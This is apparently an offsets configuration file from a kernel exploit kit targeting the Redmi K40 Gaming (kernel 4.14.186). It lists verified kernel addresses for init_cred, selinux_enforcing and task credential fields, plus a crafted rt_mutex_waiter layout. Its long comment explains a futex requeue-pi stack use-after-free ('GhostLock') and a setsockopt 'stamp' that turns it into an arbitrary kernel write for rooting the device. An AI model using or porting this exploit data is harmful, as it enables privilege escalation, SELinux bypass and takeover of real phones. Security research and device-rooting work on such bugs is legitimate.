/* Redmi K40 Gaming (ares) — MediaTek MT6893 (Dimensity 1200), kernel 4.14.186
 * MIUI/HyperOS V816.0.4.0.TKJCNXM (Android 13)
 *
 * All values extracted from the device's own boot.img:
 *   boot.img -> Image (gzip) -> vmlinux.elf (kallsyms + rela)
 *   KIMAGE_TEXT_BASE = 0xffffff8008080000  (verified via rela table)
 * Cross-checked against MiCode/Xiaomi_Kernel_OpenSource @ ares-r-oss
 * and the device's /proc/config.gz.
 *
 * uname -r: 4.14.186-g844fd19c6
 *
 * NOTE 4.14 differences vs upstream (6.1/6.6/6.12):
 *   - no kCFI / no ShadowCallStack
 *   - no configfs_read_iter / configfs_bin_write_iter / copy_splice_read
 *   - no ashmem show_fdinfo / compat_ioctl
 *   - rt_mutex_waiter is the OLD 0x50-byte layout (== STRUCT_OFFSETS_6_1)
 *   - PAGE_OFFSET is 0xffffff8000000000 (NOT 0xffffffc0...)
 */

#define PSELECT_WORDS_ARES \
  .pselect_words = { \
    { 2, WV_ZERO},   /* tree.rb_parent_color = 0 → the value written is 0 */ \
    { 3, WV_ZERO},   /* tree.rb_right = 0 (no right child) */ \
    { 4, WV_TARGET}, /* tree.rb_left = target → rb_erase does *(rb_left) = parent_color = 0 */ \
    { 5, WV_ZERO}, /* pi_tree.rb_parent_color */ \
    { 6, WV_ZERO}, /* pi_tree.rb_right */ \
    { 7, WV_ZERO}, /* pi_tree.rb_left */ \
    { 8, WV_TASK}, /* task (at 0x30) */ \
    { 9, WV_LOCK}, /* lock (at 0x38) */ \
    {10, WV_WAKE_PRIO}, /* wake_state(0x40) + prio(0x44) packed */ \
    {11, WV_ZERO}, /* deadline (at 0x48) */ \
    {-1, 0} \
  }

OFFSETS_ENTRY("4.14.186-g844fd19c6",
  /* ---- memory layout ---- */
  .kimage_text_base=0xffffff8008080000ULL,
  .p0_page_offset=0xffffff8000000000ULL,
  .p0_phys_offset=0x40000000ULL,        /* MTK DRAM base */
  .p0_kernel_phys_load=0x40080000ULL,   /* boot header kernel_addr */
  .kernelsnitch_identity_start=0xffffff8000000000ULL,
  .kernelsnitch_identity_end=0xffffff9000000000ULL,    /* PAGE_OFFSET + 64GB (KernelSnitch default) */
  .direct_map_end=0xffffff9000000000ULL,

  /* ---- global symbols (offset from KIMAGE_TEXT_BASE) ---- */
  .off_init_task=0x01C5BEC0,          /* VERIFIED: comm "swapper" @+0x798 */
  .off_init_cred=0x01C69158,          /* VERIFIED: uid=0 caps=0x3fffffffff usage=4 */
  .off_init_uts_ns=0x01C5B078,
  .off_empty_zero_page=0x01E5F000,
  .off_root_task_group=0,             /* TODO: needs call-site analysis */
  .off_selinux_enforcing=0x02080B28,  /* VERIFIED via enforcing_setup (0xffffff800a100b28) */
  .off_kptr_restrict=0,               /* TODO */
  .off_selinux_blob_sizes=0,          /* SELinux is the only LSM => lbs_cred = 0, default OK */
  .off_security_hook_heads=0,         /* only used for logging in install_android_root */
  .off_kmalloc_caches=0x015F61D8,     /* VERIFIED via ksymtab */
  .off_anon_pipe_buf_ops=0x010A3648,  /* candidate: {confirm,release,steal,get} */
  .off_ashmem_misc_fops=0x01DA6508,   /* VERIFIED: miscdevice @0xffffff8009e26508 */
  .off_ashmem_fops=0x011F1078,        /* VERIFIED: fops @0xffffff8009271078 */
  .off_ashmem_ioctl=0x00CF95B0,       /* VERIFIED */
  .off_ashmem_compat_ioctl=0,         /* NOT PRESENT in 4.14 build */
  .off_ashmem_mmap=0x00CF9ED8,        /* VERIFIED */
  .off_ashmem_open=0x00CFA040,        /* VERIFIED */
  .off_ashmem_release=0x00CFA0C0,     /* VERIFIED */
  .off_ashmem_show_fdinfo=0,          /* NOT PRESENT in 4.14 */
  /* 4.14 configfs names are the OLD ones (upstream uses *_iter names) */
  .off_configfs_read_iter=0x0029634C,      /* = configfs_read_file      */
  .off_configfs_bin_write_iter=0x00296864, /* = configfs_write_bin_file */
  .off_copy_splice_read=0,            /* NOT PRESENT in 4.14 */
  .off_noop_llseek=0x001EF408,        /* VERIFIED */
  .off_cap_capable_active=0,          /* TODO */
  .off_slide_nfulnl_logger=0x01C51500, /* ares: nfulnl_logger @ 0xffffff8009cd1500 (img off 0x1C51500) */
  .off_slide_loggers_0_1=0x01C51420,   /* ares: loggers[] @ 0xffffff8009cd1420 (slot PF_INET=0) */
  .off_slide_boot_id=0x020A2670,       /* ares: boot_id ctl_table.data @ 0xffffff800a12e670 */

  /* ---- task_struct ---- */
  .task_usage=0x40,                     /* gK72 修正: 原 0x10 错误; 铁证 __put_task_struct ldr w8,[x19,#64] + copy_process str w9,[x19,#64] */
  .task_prio=0x84,                    /* rt_mutex_setprio ldr [x,#0x8c]/[x,#0x5c] */
  .task_normal_prio=0x8C,               /* gK68 修正: 原 0x88 实为 static_prio; 铁证 rt_mutex_setprio+0xd8 ldr w22,[x19,#140] */
  .task_sched_task_group=0x848,       /* aresin verified */
  .task_pi_lock=0x85C,                /* ★ rt_mutex_adjust_prio_chain */
  .task_pi_waiters=0x868,             /* ★ */
  .task_pi_top_task=0x878,              /* gK68 修正: 原 0x870 实为 pi_waiters.rb_leftmost; 铁证 rt_mutex_setprio+0x17c str x23,[x19,#2168] */
  .task_pi_blocked_on=0x880,          /* ★ vulnerability core */
  .task_pid=0x5C4,
  .task_tgid=0x5C8,
  .task_real_parent=0x5D8,
  .task_atomic_flags=0x5F0,
  .task_real_cred=0x788,              /* == upstream 6.1 */
  .task_cred=0x790,                   /* == upstream 6.1 */
  .task_comm=0x798,
  .task_tasks=0x638,
  .task_seccomp=0xA88,

  /* ---- cred (== upstream 6.1) ---- */
  .cred_uid=0x04,
  .cred_securebits=0x24,
  .cred_caps=0x28,
  .cred_security=0x78,

  /* ---- file_operations ---- */
  .fops_owner=0x00,
  .fops_llseek=0x08,
  .fops_read=0x10,
  .fops_write=0x18,
  .fops_read_iter=0x20,
  .fops_write_iter=0x28,
  .fops_ioctl=0x50,
  .fops_compat_ioctl=0x58,
  .fops_mmap=0x60,
  .fops_open=0x68,
  .fops_release=0x78,
  .fops_splice_read=0xB8,
  .fops_show_fdinfo=0xD0,

  .mm_owner=0x3A8,                    /* get_task_mm */
  .mm_struct_sz=0x500,                /* TODO verify */

  /* ---- configfs_buffer (4.14 layout, = upstream - 16 for most fields) ---- */
  .cfg_page=16,
  .cfg_needs_read_fill=64,            /* upstream 80 */
  .cfg_bin_buffer=72,                 /* upstream 88 */
  .cfg_bin_buffer_size=80,            /* upstream 96 */
  .cfg_cb_max_size=84,                /* upstream 100 */
  .ashmem_name_prefix_len=11,         /* "dev/ashmem/" prefix used by primitive */

  /* ---- rt_mutex_waiter (4.14 old layout, size 0x50) ---- */
  .waiter_tree=0x00,
  .waiter_pi_tree=0x18,
  .waiter_task=0x30,
  .waiter_lock=0x38,
  .waiter_wake_state=0x40,
  .waiter_prio=0x40,
  .waiter_deadline=0x48,
  .waiter_ww_ctx=0x50,
.waiter_pi_tree_prio=0x40,
  .waiter_pi_tree_deadline=0x48,
  /* pselect_waiter_word_shift: index of the fd_set word that lands on
   * waiter+0x10 (waiter_pi_tree.rb_left), see prepare_pselect_fdsets().
   *
   * ★★ CORRECTED MECHANISM (2026-10-16 evening, after reading IonStack PoC +
   *    the iQOO Neo9S Pro (MT6989/6.1) working port `zhubaohe123/ghostlock-kit`)
   * ------------------------------------------------------------------------
   * GhostLock is a *stack* UAF, NOT a heap UAF, and the bug is:
   *   remove_waiter() cleans `current->pi_blocked_on` instead of the *waiter*
   *   thread's pi_blocked_on. So when the futex times out / is requeued away,
   *   the waiter thread still has task->pi_blocked_on dangling to the
   *   `struct rt_mutex_waiter` that lives ON ITS OWN KERNEL STACK (do_futex
   *   frame). The thread returns to userspace with that stale pointer.
   *
   * The exploitation primitive is therefore NOT "make fd_set and the waiter
   * overlap inside one syscall". It is "stamp": AFTER futex_wait_requeue_pi()
   * returns *in the same thread*, issue another syscall whose on-stack buffer
   * reuses the very same kernel-stack addresses as the old rt_waiter, so the
   * stale pi_blocked_on now points at attacker-controlled bytes. Then a
   * consumer thread runs sched_setattr(waiter_tid) -> rt_mutex_adjust_prio_chain
   * -> rt_mutex_dequeue -> rb_erase_cached => constrained arbitrary write.
   *
   * Hence the fd_set overlay must cover [waiter+0x00 .. waiter+0x30] fully and
   * *word-aligned*: rb_erase needs the 0x00 pc, 0x08 right, 0x10 left, the task
   * pointer at 0x30 and lock at 0x38 to be exactly right. fd_set only sets
   * individual bits (so 0x08 can never become base+0x100 as WV_TARGET wants),
   * and the pselect6/select frames sit far above do_futex anyway. -> the
   * pselect route cannot express the primitive.  Do NOT re-tune this shift.
   *
   * REPLACEMENT (upstream-proven): use a setsockopt() "stamp" instead:
   *   setsockopt(fd, SOL_IP, MCAST_JOIN_SOURCE_GROUP, buf, 0x108)
   * which runs memset(0x108)+copy_from_user(0x108) inside do_ip_setsockopt and
   * overwrites the stale waiter with a single aligned memcpy. Set buf[8]=0 so
   * the family check fails and the syscall returns cleanly (poison only, no
   * side effect). iQOO port also lists IP_MINTTL(0x20) and IP_MSFILTER(0x150)
   * as higher-priority stamps when the frame offsets differ.
   * See offsets below for the 4.14 do_ip_setsockopt frame measurement. */
  .pselect_waiter_word_shift=0,
  PSELECT_WORDS_ARES
),
